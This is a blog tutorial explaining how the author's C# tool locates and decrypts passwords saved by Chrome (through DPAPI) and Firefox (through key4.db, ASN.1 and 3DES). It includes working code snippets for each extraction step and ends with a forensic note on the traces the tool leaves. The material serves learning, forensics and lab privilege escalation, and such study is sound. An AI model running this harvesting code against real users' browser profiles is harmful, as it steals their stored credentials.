---
title: Decrypting Browser Credentials For Fun (But Not Profit)
tags: [C#, 3DES, SQLite, DPAPI, Programming, Google Chrome, Mozilla Firefox, ASN.1]
layout: post
---       

I was recently learning about web browser forensics and became interested in understanding the different ways that browsers locally store a user's credentials. I've also recently come across a few [HackTheBox](https://hackthebox.eu) machines requiring decryption of passwords from browsers for privilege escalation. This presented me with the idea for a relatively straightfoward task to start getting into C# .NET programming. What resulted was a pretty fun project that taught me a lot - and I figure it's worth documenting here. The following is my attempt to explain what I've learned and how my tool [HarvestBrowserPasswords.exe](https://github.com/Apr4h/HarvestBrowserPasswords) extracts and decrypts credentials locally stored by Google Chrome and Mozilla Firefox in Windows. Based on the research/work that's gone into building this tool, it would be pretty straightforward to add functionality for Internet Explorer/Edge credential decryption as well. Someday I might bother doing that, if it turns out anyone actually uses those browsers. 

*Disclaimer* - This post will gloss over a few topics (e.g. Microsoft DPAPI, ASN.1, 3DES.) but I'll include some good references for further research along the way rather than try to explain these in depth. I'd also like to add upfront that I relied heavily on [lClevy'S](https://github.com/lclevy) diagram of [Mozilla Password-Based Encryption](https://github.com/lclevy/firepwd/blob/master/mozilla_pbe.pdf) for writing my own tool. He's written an awesome python script for decrypting Firefox passwords - but I've tried to stay away from replicating his code for the benefit of my own learning. My code is far from perfect and I'm still very much trying to learn. If you'd like to give feedback please let me know at <apr4h.ctf@gmail.com> - otherwise, make a pull request!

## Google Chrome

### Where are the creds stored?

Google Chrome conveniently stores all of its forensic artefacts in a single location for each profile under a user's `%LocalAppData%` directory. For example, user account 'Apr4h' with two Google Chrome profiles would have one directoy containing login data for each profile, each containing their own set of stored credentials:
- `C:\Users\Apr4h\AppData\Local\Google\Chrome\User Data\Default` (This is always the name of the first profile)
- `C:\Users\Apr4h\AppData\Local\Google\Chrome\User Data\Profile 2` (Subsequent profiles are iteratively named)

The artefacts of particular interest for credential gathering are the `Login Data` (SQLite 3 database) files contained within each user's profile directory. 

### How are they stored?

`Login Data` SQLite databases primarily exist to store the usernames and passwords you wish to store for auto-fill, but also store a bunch of metadata and information about how to submit your credentials to the correct URL. For simplicity, I only care about the db's `Logins` table - specifically the 'signon_realm', `username_value` and `password_value` columns of the table. In the image below I'm using SQLiteStudio to view the database which shows me that only the `password_value` gets encrypted. This value is encrypted using Microsoft's Data Protection API (DPAPI). 

![Image](/assets/img/browser-credentials/login_data_sqlite.PNG)

The DPAPI was intended to be extremely simple to use, and consists of only two functions: **CryptProtectData()** and **CryptUnprotectData()** which symetrically encrypt/decrypt data "blobs" (arbitrary arrays of bytes) using implicit crypto keys tied to a specific user or system. The upside to DPAPI encrypted credentials is that I don't need to know any of the target user's passwords or keys in order to decrypt their creds if I am already executing code in that user's context. The downside is that some extra work needs to be done in order to decrypt credentials if I don't have code execution in the target user's context. [This awesome blog post](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) shows Mimikatz "/unprotect"-ing DPAPI encrypted creds using a target user's known password.

### Finding and Extracting Encrypted Logins

By following a few simple steps, I can begin gathering saved credentials for decryption. I'll use snippets of code from HarvestBrowserPasswords below to demonstrate each step.

#### 1. Search the current user's `%LocalAppData%\Google\Chrome` directory for profiles
```cs
public static List<string> FindChromeProfiles()
{
    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    string chromeDirectory = localAppData + @"\Google\Chrome\User Data";

    List<string> profileDirectories = new List<string>();

    if (Directory.Exists(chromeDirectory))
    {
        //Add default profile location once existence of chrome directory is confirmed
        profileDirectories.Add(chromeDirectory + "\\Default");
        foreach (string directory in Directory.GetDirectories(chromeDirectory))
        {
            if (directory.Contains("Profile "))
            {
                profileDirectories.Add(directory);

            }
        }
    }

    return profileDirectories;
}
```

#### 2. For each profile found, connect to the `Login Data` SQLite database and query for the three pieces of information we need

I used the [System.Data.SQLite](https://system.data.sqlite.org/index.html/doc/trunk/www/index.wiki) package to interact with the database like so:
```cs
private SQLiteConnection ChromeDatabaseConnection(string databaseFilePath)
{
    FilePath = databaseFilePath;
    SQLiteConnection sqliteConnection = new SQLiteConnection(
        $"Data Source={FilePath};" +
        $"Version=3;" +
        $"New=True");

    sqliteConnection.Open();

    return sqliteConnection;
}
```

Once I've got the SQLiteConnection object, I can query the db and extract data from the relevant columns:
```cs
SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

while (sqliteDataReader.Read())
{
    string formSubmitUrl = sqliteDataReader.GetString(0);

    if (string.IsNullOrEmpty(formSubmitUrl))
    {
        continue;
    }

    string username = sqliteDataReader.GetString(1);
    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
   
...
```

While building this tool I found that Chrome seems to maintain an open connection to a profile's login database whenever it is open and that profile is logged in. As a result, a `System.Data.SQLite.SQLiteException` is thrown, in which case I chose to copy the database file to `%TEMP%` to query it, then delete the temporary copy.
```cs
catch (SQLiteException)
{
    string tempDatabaseFilePath = Path.GetTempPath() + "Login Data";

    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine($"[-] Unable to access database file. Copying it to temporary location at:\n\t{Path.GetTempPath()}");
    Console.ResetColor();

    File.Copy(databaseFilePath, tempDatabaseFilePath, true);

    connection = ChromeDatabaseConnection(tempDatabaseFilePath);
    ChromeDatabaseDecrypt(connection);

    //The process will maintain a handle to the temp database file despite database connection disposal. Garbage collection necessary to release thefile for deletion
    GC.Collect();
    GC.WaitForPendingFinalizers();
    File.Delete(tempDatabaseFilePath);
}
```

#### 3. Decrypt the password!

Now that I've got the URL and username in cleartext from the db, I just need to **unprotect** (decrypt) the password via the DPAPI. As per the [Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.unprotect?view=netframework-4.8) it's super simple! The **Unprotect()** function requires three agruments - the encrypted byte array, an optional entropy value (which in our case is not needed), and the "scope" in which the data was encrytpted (either CurrentUser or LocalMachine).

```cs
byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);
```

At this point, the DPAPI has been fully reverse engineered and [this paper](https://elie.net/static/files/reversing-dpapi-and-stealing-windows-secrets-offline/reversing-dpapi-and-stealing-windows-secrets-offline-paper.pdf) details the full cryptographic scheme. It also details some cool attacks against DPAPI that are worth checking out.

### And that's all there is to it!

I created a `BrowserLoginData` Object to be able to store the resultant decrypted credentials. The tool instanciates a new `BrowserLoginData` object for each decrypted set of logins and append them to a list for output to the console or a file.

```cs
BrowserLoginData loginData = new BrowserLoginData(formSubmitUrl, username, decryptedPasswordString, "Chrome");
ChromeLoginDataList.Add(loginData);
```

Here's what it looks like when these are printed to the console:
![Image](/assets/img/browser-credentials/HBP_chrome_example.PNG)

# Mozilla Firefox

As mentioned earlier, I relied heavily on research done by the developer of [firepwd](https://github.com/lclevy/firepwd) to understand how Mozilla deals with storage and encryption of credentials. This post references [this diagram](https://github.com/lclevy/firepwd/blob/master/mozilla_pbe.pdf) which is shown below. Firefox encrypts logins using [3DES](https://en.wikipedia.org/wiki/Triple_DES) in [CBC mode](http://cryptowiki.net/index.php?title=Cipher_Block_Chaining_(CBC)). The diagram shows Mozilla's master decryption key stored in **key3.db** (Berkley DB format) and encrypted logins stored in **signons.sqlite**. This was used in previous versions of Firefox and since version 58 logins are now stored in **key4.db** (SQLite) while encrypted logins are stored in **logins.json**. My tool only supports decryption of Firefox credentials from versions 58+.

![Image](/assets/img/browser-credentials/mozilla_pbe.PNG)

Mozilla maintain their own cryptography libraries called [Network Security Services (NSS)](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS) which become important later, particularly due to its use of [ASN.1](https://en.wikipedia.org/wiki/Abstract_Syntax_Notation_One) for serialisation of data. One other big difference between Chrome and Firefox, is that Firefox allows users to supply a master password to encrypt all of their stored logins. HarvestBrowserPasswords can take a master password as a command-line argument and use it for decryption (assuming the password is known). If the user hasn't supplied a master password, the encryption key can be extracted from an SQLite database in the user's profile directory.

### Where are the creds stored?

Users' Firefox profiles are each stored in their own directory under `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\`. In recent versions of Firefox, there are two relevant artefacts required for decryption of stored credentials.

* `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\key4.db`
* `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\logins.json`

### How are they stored?
* `logins.json` stores all of the user's logins, including URLs, usernames, passwords and other metadata as JSON. It is worth noting that both the usernames and passwords in these files are 3DES encrypted, then ASN.1 encoded and finally written to the file base64 encoded. 
```json
{
	"nextId": 2,
	"logins": [
		{
			"id": 1,
			"hostname": "https://firefox.com",
			"httpRealm": null,
			"formSubmitURL": "accounts.firefox.com",
			"usernameField": "username",
			"passwordField": "password",
			"encryptedUsername": "MDoEE...9UJAv",
			"encryptedPassword": "MDoEE...oMpLc",
			"guid": "{2f7093ef-52d4-4246-b48d-0a54c67ff985}",
			"encType": 1,
			"timeCreated": 1361617912000,
			"timeLastUsed": 1361617912000,
			"timePasswordChanged": 1361617912000,
			"timesUsed": 1
		}
		],	
	"disabledHosts": [],
	"version": 2
}
```


* `key4.db` Stores the master key for 3DES decryption of all passwords stored in `logins.json`, along with a "password-check" value that is used to validate decryption of the master key. The  "password-check" value is located in 

### Putting it all together - Decrypting logins

Based on this information, the steps for decrypting logins is as follows:

1. Locate user profiles, then extract the encoded + encrypted "password-check" data from `key4.db`
2. ASN.1 decode, then 3DES decrypt the "password-check" data
	* This is done to confirm that either the supplied master password is correct, or that no password was supplied. 
3. Extract the encoded + encrypted master key from `key4.db`
4. ASN.1 decode, then 3DES decrypt the master key 
5. Read and JSON deserialise the encrypted logins from `logins.json`
6. ASN.1 decode, then 3DES decrypt the login data using the master key

### Step 1 - Locate profiles and extract "password-check" data

HarvestBrowserPasswords locates Firefox profile directories/files and queries SQLite databases the same as it did for Chrome.

This image shows the location of the [ASN.1 DER (Distinguished Encoding Rules)](https://docs.microsoft.com/en-us/windows/win32/seccertenroll/about-der-encoding-of-asn-1-types) encoded data which includes the 'password-check' value. The 'item1' value in the 'password' row contains the global salt value used during encryption. 'item2' contains the ASN.1 encoded BLOB which contains the encrypyed value 'password-check\x02\x02' and the entry salt used for encryption.
![Image](/assets/img/browser-credentials/key4db.PNG)

I hacked together a class to repeatedly parse and store the ASN.1 encoded data used throughout the password extraction process. ASN.1 uses a [TLV (Type, Length, Value)](https://en.wikipedia.org/wiki/Type-length-value) data format and the data in question uses only a few of the DER data types which made things easier. The following snippet is the enum used in the parser class to check the DER data type of each TLV in an encoded BLOB - it shows which data types are used by Mozilla for password based encryption and the corresponding value of each 'Type' byte in a TLV sequence. 

```cs
enum ASN1Types
{
    SEQUENCE = 0x30,
    OCTETSTRING = 4,
    OBJECTIDENTIFIER = 6,
    INTEGER = 2,
    NULL = 5
}
```

Here's an example of what the parsed out ASN.1 data for the 'password-check' value would look like (from firepwd):
```
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3
         SEQUENCE {
           OCTETSTRING entry_salt_for_passwd_check
           INTEGER 01
         }
       }
       OCTETSTRING encrypted_password_check
     }
```
### Step 2 - ASN.1 Decode and Decrypt 'password-check'

My ASN.1 parser class recursively parses an ASN.1 encoded BLOB into an object. Each object contains a list of `Sequence` objects to represent the structure above and handle other cases required for encoded login data and master keys. 
```cs
GlobalSalt = (byte[])dataReader[0]; //item1 from key4.db

byte[] item2Bytes = (byte[])dataReader[1]; //item2 from key4.db

ASN1 passwordCheckASN1 = new ASN1(item2Bytes);

EntrySaltPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
CipherTextPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
```

Once the data is an ASN1 object as Sequences, the values required for decryption can be extracted, and the result can be checked against a hard-coded value of `password-check\x02\x02` to ensure the correct password/values were used. The `MasterPassword` is an empty string if no password was provided as a command line argument. 
```cs
DecryptedPasswordCheck = Decrypt3DES(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);
```

#### Mozilla Password-Based Encryption

The `Decrypt3DES()` function follows the format specified in the red box of the Mozilla PBE diagram above. The exact same process is followed for "password-check" and master key decryption.

First the master password gets hashed using the parameters passed to the `Decrypt3DES()` function:
```cs
byte[] hashedPassword = new byte[globalSalt.Length + password.Length];
Buffer.BlockCopy(globalSalt, 0, hashedPassword, 0, globalSalt.Length);
Buffer.BlockCopy(password, 0, hashedPassword, globalSalt.Length, password.Length);

using (SHA1 sha1 = new SHA1CryptoServiceProvider())
{
	hashedPassword = sha1.ComputeHash(hashedPassword);
}
```

Then the hashed password is combined with the entry salt and hashed:
```cs
byte[] combinedHashedPassword = new byte[hashedPassword.Length + entrySalt.Length];
Buffer.BlockCopy(hashedPassword, 0, combinedHashedPassword, 0, hashedPassword.Length);
Buffer.BlockCopy(entrySalt, 0, combinedHashedPassword, hashedPassword.Length, entrySalt.Length);

using (SHA1 sha1 = new SHA1CryptoServiceProvider())
{   
	combinedHashedPassword = sha1.ComputeHash(combinedHashedPassword);
}
```

The decryption key (and initialisation vector/nonce) is then created by joining two HMAC-SHA1 values which are calculated using the previously created values. The key is taken from the first 24 bytes and the IV from the last 8 bytes.
```cs
byte[] edeKey;

using (HMACSHA1 hmac = new HMACSHA1(combinedHashedPassword))
{
    //First half of EDE Key = HMAC-SHA1( key=combinedHashedPassword, msg=paddedEntrySalt+entrySalt)
    byte[] firstHalf = new byte[paddedEntrySalt.Length + entrySalt.Length];
    Buffer.BlockCopy(paddedEntrySalt, 0, firstHalf, 0, paddedEntrySalt.Length);
    Buffer.BlockCopy(entrySalt, 0, firstHalf, paddedEntrySalt.Length, entrySalt.Length);

    //Create TK = HMAC-SHA1(combinedHashedPassword, paddedEntrySalt)
    keyFirstHalf = hmac.ComputeHash(firstHalf);
    byte[] tk = hmac.ComputeHash(paddedEntrySalt);

    //Second half of EDE key = HMAC-SHA1(combinedHashedPassword, tk + entrySalt)
    byte[] secondHalf = new byte[tk.Length + entrySalt.Length];
    Buffer.BlockCopy(tk, 0, secondHalf, 0, entrySalt.Length);
    Buffer.BlockCopy(entrySalt, 0, secondHalf, tk.Length, entrySalt.Length);

    keySecondHalf = hmac.ComputeHash(secondHalf);

    //Join first and second halves of EDE key
    byte[] tempKey = new byte[keyFirstHalf.Length + keySecondHalf.Length];
    Buffer.BlockCopy(keyFirstHalf, 0, tempKey, 0, keyFirstHalf.Length);
    Buffer.BlockCopy(keySecondHalf, 0, tempKey, keyFirstHalf.Length, keySecondHalf.Length);

    edeKey = tempKey;
}

byte[] key = new byte[24];
byte[] iv = new byte[8];

//Extract 3DES encryption key from first 24 bytes of EDE key
Buffer.BlockCopy(edeKey, 0, key, 0, 24);

//Extract initialization vector from last 8 bytes of EDE key
Buffer.BlockCopy(edeKey, (edeKey.Length - 8), iv, 0, 8);
```

Now all that's left is to perform the 3DES decryption using the key and IV
```cs
using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
{
    Key = key,
    IV = iv,
    Mode = CipherMode.CBC,
    Padding = PaddingMode.None
})
{
    ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
    decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
}
```
the `decryptedResult` is returned from the function and checked against the value 'password-check\x02\x02'. If successful, the correct password was used for decryption, and this process can be repeated to decrypt master 3DES encryption key for the user's login data.

### Step 3 - Extract the master decryption key

The same `SQLiteDatabaseConnection` used to query the data for the password check is re-used to query the **nssPrivate** table for the entry salt and encrypted 3DES key. These values are stored in the **a11** column of the only row in this table.

```cs
SQLiteCommand commandNSSPrivateQuery = connection.CreateCommand();
commandNSSPrivateQuery.CommandText = "SELECT a11 FROM nssPrivate";
dataReader = commandNSSPrivateQuery.ExecuteReader();
```

### Step 4 - Decode and decrypt the master key

This step requires nothing new. First the ASN.1 encoded BLOB is parsed in order to extract the entry salt and encrypted master key. 
```cs
byte[] a11 = (byte[])dataReader[0];

ASN1 masterKeyASN1 = new ASN1(a11);

EntrySalt3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
CipherText3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
```

Then these values are passed to the `Decrypt3DES()` function with the same password value. The decrypted master key maybe PKCS#7 padded
```cs
if (PasswordCheck(DecryptedPasswordCheck))
{
    Decrypted3DESKey = Decrypt3DES(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
    Decrypted3DESKey = Unpad(Decrypted3DESKey);
    
    ...
```

### Step 5 - Read and deserialise encrypted credentials

 I used [Json.NET from Newtonsoft](https://www.newtonsoft.com/json/help/html/Introduction.htm) to deserialise the login data in `logins.json`. Visual Studio makes it fairly easy to handle JSON data and creates a class for you just by copy/pasting the JSON data into a new class file. In this particular case, a "Rootobject" will contain an array of "Login" nested classes, which store all of the data for each individual login. From there it's easy to extract all of the login data:

```cs
public FirefoxLoginsJSON.Rootobject GetJSONLogins(string profileDir)
{
    string file = File.ReadAllText(profileDir + @"\logins.json");
    FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);

    return JSONLogins;
}
```

### Step 6 - Decrypt the creds!

A collection of login data is now available as `JSONLogins`. Each `JSONLogins.Login.EncryptedUsername` and `JSONLogins.Login.EncryptedPAssword` is also still ASN.1. The ASN.1 data structure is slightly different to that used for the master key and password check as can be seen below. All that's left to do is:

1. iterate over each `Login` object in `JSONLogins`  
2. ASN.1 decode each username and password
3. 3DES decrypy each username and password using the master key
4. Add each decrypted username and password to a collection along with the corresponding URL
```cs
foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
{                 
    if (string.IsNullOrWhiteSpace(login.FormSubmitURL))
    {
	byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
	byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);

	ASN1 usernameASN1 = new ASN1(usernameBytes);

	byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
	byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

	ASN1 passwordASN1 = new ASN1(passwordBytes);

	byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
	byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

	string decryptedUsername = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
	string decryptedPassword = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));

	BrowserLoginData loginData = new BrowserLoginData(login.FormSubmitURL, decryptedUsername, decryptedPassword, "Firefox");
	FirefoxLoginDataList.Add(loginData);
    }
}
```
## And that's it!

Here's the tool decrypting some bogus firefox logins as an example
![Image](/assets/img/browser-credentials/HBP_firefox_example.PNG)

Decryption using non-standard master password
![Image](/assets/img/browser-credentials/HBP_firefox_masterpassword_example.PNG)

# Other Examples

Collecting Chrome and Firefox credentials and outputting both to the console
![Image](/assets/img/browser-credentials/HBP_all_example.PNG)

Writing output to CSV
![Image](/assets/img/browser-credentials/HBP_all_csv_example.PNG)

# Interesting Forensic Note: 
After testing I was wondering what interesting forensic artefacts might be created by using this tool. Obvious ones that came to mind were:
* File creation when dropping exe to disc
* UserAssist and AppCompatCache entries when the tool is run
* Timestamp modification of databases/files accessed

One other interesting thing I noticed is that Event ID 5379 ("Credential Manager credentials were read") will be created in Security.evtx for each Chrome password decrypted. The tool should easily manage decryption of all Chrome logins within 1-2 seconds, so a huge stack of these Events in short succession could potentially stick out.
